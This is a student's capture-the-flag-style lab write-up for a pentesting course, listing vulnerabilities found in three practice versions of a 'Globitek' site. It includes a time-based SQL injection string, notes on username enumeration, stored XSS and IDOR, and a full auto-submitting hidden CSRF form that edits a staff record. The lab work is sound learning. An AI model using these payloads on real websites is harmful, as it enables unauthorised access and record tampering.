# Project 8 - Pentesting Live Targets

Time spent: **X** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

#### Vulnerability #1: SQL Injection
- The id parameter is vulnerable to SQL Injection like the example shown, using ' OR SLEEP(5)=0--' for the id, where it goes to sleep for 5 seconds and default back to the person with id 1.

#### Vulnerability #2: __________________


## Green

#### Vulnerability #1: Username Enumeration
* The login page returns a bolded text "Log in was unsuccessful" for existing username (ie. jmonroe99), but normal text for any other usernames, with any random passwords for both kinds of users. Red and Blue sites always return bolded text. An attacker can simply bruteforce to enumerate a list of users.

#### Vulnerability #2: Cross-Site Scripting
- The Contact form's feedback field can be injected with with a stored XSS, that is executed when the administrator logins to view the feedback. (Note: The first 6 iframes feedbacks were all 1's and could not be deleted, thus the next few could not be displayed with any other text of my name).

## Red

#### Vulnerability #1: Insecure Direct Object Reference 
- Simply change the number of the id in the URL
- ID 10 and 11 are employees not shown on the "Find a Salesperson" page, and they are not supposed to be accessible indicated by the comments next to their names.
- Blue and Green sites check access control and redirect the page to the main directory page again.

#### Vulnerability #2: Cross-Site Request Forgery
- A malicious link to the form can be clicked by the administrator log in session to carry out the hidden form for the edit POST request
- ClickMe Hidden form:
```
<html>
  <head>
    <title>Fake Form</title>
  </head>
  <body onload="document.edit_salesperson.submit()">
    <form action="https://35.194.42.150/red/public/staff/salespeople/edit.php?id=2" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="Hung"><br>
      <input type="text" name="last_name" value="CSRF"><br>
      <input type="text" name="phone" value="133-713-3713"><br>
      <input type="text" name="email" value="csrf@csrf.com"><br>
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```
